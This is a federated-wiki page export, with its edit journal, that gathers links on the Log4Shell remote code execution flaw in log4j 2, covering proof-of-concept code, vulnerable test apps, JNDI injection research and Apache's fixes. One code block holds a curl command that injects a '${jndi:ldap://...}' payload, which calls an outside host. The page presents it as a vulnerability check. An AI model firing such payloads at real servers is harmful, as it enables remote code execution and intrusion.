{
  "title": "Log4Shell",
  "story": [
    {
      "type": "markdown",
      "id": "c914fcb6ce345a70",
      "text": "RCE 0-day exploit found in log4j 2, a popular Java logging package [https://www.lunasec.io/docs/blog/log4j-zero-day/ post] [https://news.ycombinator.com/item?id=29504755 hn] [https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/ reddit] [https://twitter.com/freeqaz/status/1469121757361569793?s=20 tweet]"
    },
    {
      "type": "paragraph",
      "id": "d50d06f17bda6b1c",
      "text": "[[LDAP]] attack vector"
    },
    {
      "type": "paragraph",
      "id": "ef09198b8243d26f",
      "text": "(PoC) of the pen testing group 0x0021h.  [https://github.com/0x0021h/apache-log4j-rce/blob/main/poc/src/main/java/log4j.java github]"
    },
    {
      "type": "paragraph",
      "id": "4012fabc795758f9",
      "text": "[[Log4j]] impact on manufacturers and components summary from the Internet community. If Manufacturer or Component is not verified, it does not have screenshots or references to prove that it is affected. [https://github.com/YfryTchsGD/Log4jAttackSurface#intro github]"
    },
    {
      "type": "paragraph",
      "id": "f82f57912abe45a9",
      "text": "Log4Shell sample vulnerable application (CVE-2021-44228). [https://github.com/christophetd/log4shell-vulnerable-app#log4shell-sample-vulnerable-application-cve-2021-44228 github]"
    },
    {
      "type": "markdown",
      "id": "ab4e25036428dd63",
      "text": "Also see *Exploiting JNDI Injections in Java*. [https://www.veracode.com/blog/research/exploiting-jndi-injections-java post]"
    },
    {
      "type": "paragraph",
      "id": "67bb999161225ff7",
      "text": "Context: How to identify if your server is vulnerable.​ [https://www.lunasec.io/docs/blog/log4j-zero-day/#how-to-identify-if-your-server-is-vulnerable post]"
    },
    {
      "type": "code",
      "id": "bb3fa38836bead5c",
      "text": "curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'"
    },
    {
      "type": "paragraph",
      "id": "58b6886d75943a73",
      "text": "Next: Run Your Own [[Authoritative DNS Server]]s"
    },
    {
      "type": "paragraph",
      "id": "502f38dd84ac7395",
      "text": "Add property to disable message pattern converter lookups. [https://issues.apache.org/jira/browse/LOG4J2-2109 issue]"
    },
    {
      "type": "paragraph",
      "id": "6fb2751616a27bd3",
      "text": " LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 [https://github.com/apache/logging-log4j2/pull/607/files github]"
    },
    {
      "type": "paragraph",
      "id": "573c0463260735a6",
      "text": "Message lookups should be disabled by default. [https://issues.apache.org/jira/browse/LOG4J2-3198 issue]"
    },
    {
      "type": "paragraph",
      "id": "9f1fecb2183608bf",
      "text": "PSA: Log4Shell and the current state of JNDI injection. [https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/ post]"
    }
  ],
  "journal": [
    {
      "type": "create",
      "item": {
        "title": "Log4Shell",
        "story": []
      },
      "date": 1639315458256
    },
    {
      "item": {
        "type": "factory",
        "id": "c914fcb6ce345a70"
      },
      "id": "c914fcb6ce345a70",
      "type": "add",
      "date": 1639315463601
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "paragraph",
        "id": "c914fcb6ce345a70",
        "text": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
      },
      "date": 1639315465338
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "markdown",
        "id": "c914fcb6ce345a70",
        "text": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
      },
      "date": 1639315466328
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "markdown",
        "id": "c914fcb6ce345a70",
        "text": "RCE 0-day exploit found in log4j 2, a popular Java logging package [https://www.lunasec.io/docs/blog/log4j-zero-day/ post]"
      },
      "date": 1639315484722
    },
    {
      "item": {
        "type": "factory",
        "id": "4012fabc795758f9"
      },
      "id": "4012fabc795758f9",
      "type": "add",
      "after": "c914fcb6ce345a70",
      "date": 1639324277739
    },
    {
      "type": "edit",
      "id": "4012fabc795758f9",
      "item": {
        "type": "paragraph",
        "id": "4012fabc795758f9",
        "text": "https://github.com/YfryTchsGD/Log4jAttackSurface#intro"
      },
      "date": 1639324283184
    },
    {
      "type": "edit",
      "id": "4012fabc795758f9",
      "item": {
        "type": "paragraph",
        "id": "4012fabc795758f9",
        "text": "[https://github.com/YfryTchsGD/Log4jAttackSurface#intro github]"
      },
      "date": 1639324290117
    },
    {
      "type": "edit",
      "id": "4012fabc795758f9",
      "item": {
        "type": "paragraph",
        "id": "4012fabc795758f9",
        "text": "Log4j impact on manufacturers and components summary from the Internet community. If Manufacturer or Component is not verified, it does not have screenshots or references to prove that it is affected. [https://github.com/YfryTchsGD/Log4jAttackSurface#intro github]"
      },
      "date": 1639324305353
    },
    {
      "type": "edit",
      "id": "4012fabc795758f9",
      "item": {
        "type": "paragraph",
        "id": "4012fabc795758f9",
        "text": "[[Log4j]] impact on manufacturers and components summary from the Internet community. If Manufacturer or Component is not verified, it does not have screenshots or references to prove that it is affected. [https://github.com/YfryTchsGD/Log4jAttackSurface#intro github]"
      },
      "date": 1639324315056
    },
    {
      "item": {
        "type": "factory",
        "id": "ef09198b8243d26f"
      },
      "id": "ef09198b8243d26f",
      "type": "add",
      "after": "4012fabc795758f9",
      "date": 1639325404566
    },
    {
      "type": "edit",
      "id": "ef09198b8243d26f",
      "item": {
        "type": "paragraph",
        "id": "ef09198b8243d26f",
        "text": "[https://github.com/0x0021h/apache-log4j-rce/blob/main/poc/src/main/java/log4j.java github]"
      },
      "date": 1639325415699
    },
    {
      "type": "edit",
      "id": "ef09198b8243d26f",
      "item": {
        "type": "paragraph",
        "id": "ef09198b8243d26f",
        "text": "(PoC) of the pen testing group 0x0021h.  [https://github.com/0x0021h/apache-log4j-rce/blob/main/poc/src/main/java/log4j.java github]"
      },
      "date": 1639325458929
    },
    {
      "id": "ef09198b8243d26f",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "ef09198b8243d26f",
        "4012fabc795758f9"
      ],
      "date": 1639325462347
    },
    {
      "item": {
        "type": "factory",
        "id": "d50d06f17bda6b1c"
      },
      "id": "d50d06f17bda6b1c",
      "type": "add",
      "after": "4012fabc795758f9",
      "date": 1639325519481
    },
    {
      "type": "edit",
      "id": "d50d06f17bda6b1c",
      "item": {
        "type": "paragraph",
        "id": "d50d06f17bda6b1c",
        "text": "LDAP attack vector"
      },
      "date": 1639325523725
    },
    {
      "id": "d50d06f17bda6b1c",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "d50d06f17bda6b1c",
        "ef09198b8243d26f",
        "4012fabc795758f9"
      ],
      "date": 1639325526308
    },
    {
      "type": "edit",
      "id": "d50d06f17bda6b1c",
      "item": {
        "type": "paragraph",
        "id": "d50d06f17bda6b1c",
        "text": "[[LDAP]] attack vector"
      },
      "date": 1639325532470
    },
    {
      "item": {
        "type": "factory",
        "id": "f82f57912abe45a9"
      },
      "id": "f82f57912abe45a9",
      "type": "add",
      "after": "4012fabc795758f9",
      "date": 1639325642190
    },
    {
      "type": "edit",
      "id": "f82f57912abe45a9",
      "item": {
        "type": "paragraph",
        "id": "f82f57912abe45a9",
        "text": "Log4Shell sample vulnerable application (CVE-2021-44228)"
      },
      "date": 1639325645361
    },
    {
      "type": "edit",
      "id": "f82f57912abe45a9",
      "item": {
        "type": "paragraph",
        "id": "f82f57912abe45a9",
        "text": "Log4Shell sample vulnerable application (CVE-2021-44228). [https://github.com/christophetd/log4shell-vulnerable-app#log4shell-sample-vulnerable-application-cve-2021-44228 github]"
      },
      "date": 1639325668699
    },
    {
      "item": {
        "type": "factory",
        "id": "ab4e25036428dd63"
      },
      "id": "ab4e25036428dd63",
      "type": "add",
      "after": "f82f57912abe45a9",
      "date": 1639325899844
    },
    {
      "type": "edit",
      "id": "ab4e25036428dd63",
      "item": {
        "type": "paragraph",
        "id": "ab4e25036428dd63",
        "text": "Also see *Exploiting JNDI Injections in Java* "
      },
      "date": 1639325913081
    },
    {
      "type": "edit",
      "id": "ab4e25036428dd63",
      "item": {
        "type": "paragraph",
        "id": "ab4e25036428dd63",
        "text": "Also see *Exploiting JNDI Injections in Java* [https://www.veracode.com/blog/research/exploiting-jndi-injections-java post]"
      },
      "date": 1639325925766
    },
    {
      "type": "edit",
      "id": "ab4e25036428dd63",
      "item": {
        "type": "markdown",
        "id": "ab4e25036428dd63",
        "text": "Also see *Exploiting JNDI Injections in Java* [https://www.veracode.com/blog/research/exploiting-jndi-injections-java post]"
      },
      "date": 1639325927408
    },
    {
      "item": {
        "type": "factory",
        "id": "58b6886d75943a73"
      },
      "id": "58b6886d75943a73",
      "type": "add",
      "after": "ab4e25036428dd63",
      "date": 1639326085770
    },
    {
      "type": "edit",
      "id": "58b6886d75943a73",
      "item": {
        "type": "paragraph",
        "id": "58b6886d75943a73",
        "text": "Next: [[Run Your Own Authoritative DNS Servers]]"
      },
      "date": 1639326092262
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "markdown",
        "id": "c914fcb6ce345a70",
        "text": "RCE 0-day exploit found in log4j 2, a popular Java logging package [https://www.lunasec.io/docs/blog/log4j-zero-day/ post] [https://news.ycombinator.com/item?id=29504755 hn]"
      },
      "date": 1639326171232
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "markdown",
        "id": "c914fcb6ce345a70",
        "text": "RCE 0-day exploit found in log4j 2, a popular Java logging package [https://www.lunasec.io/docs/blog/log4j-zero-day/ post] [https://news.ycombinator.com/item?id=29504755 hn] [https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/ reddit]"
      },
      "date": 1639326216491
    },
    {
      "type": "edit",
      "id": "c914fcb6ce345a70",
      "item": {
        "type": "markdown",
        "id": "c914fcb6ce345a70",
        "text": "RCE 0-day exploit found in log4j 2, a popular Java logging package [https://www.lunasec.io/docs/blog/log4j-zero-day/ post] [https://news.ycombinator.com/item?id=29504755 hn] [https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/ reddit] [https://twitter.com/freeqaz/status/1469121757361569793?s=20 tweet]"
      },
      "date": 1639326360669
    },
    {
      "type": "edit",
      "id": "58b6886d75943a73",
      "item": {
        "type": "paragraph",
        "id": "58b6886d75943a73",
        "text": "Next: Run Your Own [[Authoritative DNS Server]]s"
      },
      "date": 1639326452124
    },
    {
      "item": {
        "type": "factory",
        "id": "573c0463260735a6"
      },
      "id": "573c0463260735a6",
      "type": "add",
      "after": "58b6886d75943a73",
      "date": 1639327071891
    },
    {
      "type": "edit",
      "id": "573c0463260735a6",
      "item": {
        "type": "paragraph",
        "id": "573c0463260735a6",
        "text": "Message lookups should be disabled by default"
      },
      "date": 1639327076401
    },
    {
      "type": "edit",
      "id": "573c0463260735a6",
      "item": {
        "type": "paragraph",
        "id": "573c0463260735a6",
        "text": "Message lookups should be disabled by default [https://issues.apache.org/jira/browse/LOG4J2-3198 issue]"
      },
      "date": 1639327123029
    },
    {
      "type": "edit",
      "id": "573c0463260735a6",
      "item": {
        "type": "paragraph",
        "id": "573c0463260735a6",
        "text": "Message lookups should be disabled by default. [https://issues.apache.org/jira/browse/LOG4J2-3198 issue]"
      },
      "date": 1639327129322
    },
    {
      "type": "add",
      "id": "6fb2751616a27bd3",
      "item": {
        "type": "paragraph",
        "id": "6fb2751616a27bd3",
        "text": " LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 "
      },
      "after": "573c0463260735a6",
      "date": 1639327165964
    },
    {
      "type": "edit",
      "id": "6fb2751616a27bd3",
      "item": {
        "type": "paragraph",
        "id": "6fb2751616a27bd3",
        "text": " LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 [https://github.com/apache/logging-log4j2/pull/607/files github]"
      },
      "date": 1639327180305
    },
    {
      "type": "add",
      "id": "502f38dd84ac7395",
      "item": {
        "type": "paragraph",
        "id": "502f38dd84ac7395",
        "text": "Add property to disable message pattern converter lookups"
      },
      "after": "6fb2751616a27bd3",
      "date": 1639327209203
    },
    {
      "type": "edit",
      "id": "502f38dd84ac7395",
      "item": {
        "type": "paragraph",
        "id": "502f38dd84ac7395",
        "text": "Add property to disable message pattern converter lookups. [https://issues.apache.org/jira/browse/LOG4J2-2109 issues"
      },
      "date": 1639327224685
    },
    {
      "type": "edit",
      "id": "502f38dd84ac7395",
      "item": {
        "type": "paragraph",
        "id": "502f38dd84ac7395",
        "text": "Add property to disable message pattern converter lookups. [https://issues.apache.org/jira/browse/LOG4J2-2109 issue]"
      },
      "date": 1639327227131
    },
    {
      "id": "502f38dd84ac7395",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "d50d06f17bda6b1c",
        "ef09198b8243d26f",
        "4012fabc795758f9",
        "f82f57912abe45a9",
        "ab4e25036428dd63",
        "58b6886d75943a73",
        "573c0463260735a6",
        "502f38dd84ac7395",
        "6fb2751616a27bd3"
      ],
      "date": 1639327242959
    },
    {
      "id": "573c0463260735a6",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "d50d06f17bda6b1c",
        "ef09198b8243d26f",
        "4012fabc795758f9",
        "f82f57912abe45a9",
        "ab4e25036428dd63",
        "58b6886d75943a73",
        "502f38dd84ac7395",
        "6fb2751616a27bd3",
        "573c0463260735a6"
      ],
      "date": 1639327245159
    },
    {
      "type": "add",
      "id": "67bb999161225ff7",
      "item": {
        "type": "paragraph",
        "id": "67bb999161225ff7",
        "text": "Context: https://www.lunasec.io/docs/blog/log4j-zero-day/#how-to-identify-if-your-server-is-vulnerable"
      },
      "after": "58b6886d75943a73",
      "date": 1639327720195
    },
    {
      "type": "edit",
      "id": "67bb999161225ff7",
      "item": {
        "type": "paragraph",
        "id": "67bb999161225ff7",
        "text": "Context: How to identify if your server is vulnerable.​ [https://www.lunasec.io/docs/blog/log4j-zero-day/#how-to-identify-if-your-server-is-vulnerable post]"
      },
      "date": 1639327746076
    },
    {
      "item": {
        "type": "factory",
        "id": "bb3fa38836bead5c"
      },
      "id": "bb3fa38836bead5c",
      "type": "add",
      "after": "573c0463260735a6",
      "date": 1639327773469
    },
    {
      "type": "edit",
      "id": "bb3fa38836bead5c",
      "item": {
        "type": "code",
        "id": "bb3fa38836bead5c",
        "text": "curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'"
      },
      "date": 1639327775569
    },
    {
      "id": "bb3fa38836bead5c",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "d50d06f17bda6b1c",
        "ef09198b8243d26f",
        "4012fabc795758f9",
        "f82f57912abe45a9",
        "ab4e25036428dd63",
        "58b6886d75943a73",
        "67bb999161225ff7",
        "bb3fa38836bead5c",
        "502f38dd84ac7395",
        "6fb2751616a27bd3",
        "573c0463260735a6"
      ],
      "date": 1639327778101
    },
    {
      "id": "58b6886d75943a73",
      "type": "move",
      "order": [
        "c914fcb6ce345a70",
        "d50d06f17bda6b1c",
        "ef09198b8243d26f",
        "4012fabc795758f9",
        "f82f57912abe45a9",
        "ab4e25036428dd63",
        "67bb999161225ff7",
        "bb3fa38836bead5c",
        "58b6886d75943a73",
        "502f38dd84ac7395",
        "6fb2751616a27bd3",
        "573c0463260735a6"
      ],
      "date": 1639327811500
    },
    {
      "type": "edit",
      "id": "ab4e25036428dd63",
      "item": {
        "type": "markdown",
        "id": "ab4e25036428dd63",
        "text": "Also see *Exploiting JNDI Injections in Java*. [https://www.veracode.com/blog/research/exploiting-jndi-injections-java post]"
      },
      "date": 1639327836093
    },
    {
      "item": {
        "type": "factory",
        "id": "9f1fecb2183608bf"
      },
      "id": "9f1fecb2183608bf",
      "type": "add",
      "after": "573c0463260735a6",
      "date": 1639329955540
    },
    {
      "type": "edit",
      "id": "9f1fecb2183608bf",
      "item": {
        "type": "paragraph",
        "id": "9f1fecb2183608bf",
        "text": "PSA: Log4Shell and the current state of JNDI injection"
      },
      "date": 1639329958740
    },
    {
      "type": "edit",
      "id": "9f1fecb2183608bf",
      "item": {
        "type": "paragraph",
        "id": "9f1fecb2183608bf",
        "text": "PSA: Log4Shell and the current state of JNDI injection. [https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/ post]"
      },
      "date": 1639329969007
    }
  ]
}